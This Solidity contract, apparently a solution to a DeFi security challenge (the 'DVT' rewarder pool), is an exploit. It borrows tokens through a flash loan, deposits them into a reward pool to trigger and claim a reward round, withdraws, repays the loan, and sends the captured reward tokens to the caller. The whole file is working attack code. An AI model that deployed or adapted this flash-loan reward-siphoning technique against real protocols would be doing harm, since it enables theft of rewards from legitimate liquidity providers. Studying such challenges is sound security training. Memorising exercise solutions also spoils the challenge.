// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*

  - initiate flashloan
  - deposit into the reward pool
  - return funds to flashloan pool
  - w/d from the reward pool

*/

interface IAttackRewarder {
  function deposit(uint256 amountToDeposit) external payable;
  function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
  function flashLoan(uint256 amount) external;
}

interface IFlashLoanReceiver {
  function receiveFlashLoan(uint256 amount) external;
}

contract AttackRewarder is IFlashLoanReceiver {

  IAttackRewarder internal rewardContract;
  IFlashLoanerPool internal flashContract;
  IERC20 internal liquidityToken;
  IERC20 internal rewardToken;
  uint256 internal attackAmount;

  constructor(
    address _flashContractAddr,
    address _rewardContractAddr,
    address _liquidityTokenAddr,
    address _rewardTokenAddr,
    uint256 _attackAmount
  ) {
    rewardContract = IAttackRewarder(_rewardContractAddr);
    flashContract = IFlashLoanerPool(_flashContractAddr);
    liquidityToken = IERC20(_liquidityTokenAddr);
    rewardToken = IERC20(_rewardTokenAddr);
    attackAmount = _attackAmount;
  }

  function attack() external {
    // initiate the flashloan
    flashContract.flashLoan(attackAmount);

    // transfer the rewards to the attacker
    rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 amount) external override {
    // approve the reward contract for the deposit 'transferFrom()'
    liquidityToken.approve(address(rewardContract), amount);

    // deposit DVT to the reward contract to update the accounting and trigger a new round
    rewardContract.deposit(amount);

    // withdraw the rewards from the reward contract
    rewardContract.withdraw(amount);

    // transfer back the DVT to the flashloan contract
    liquidityToken.transfer(address(flashContract), amount);
  }

}
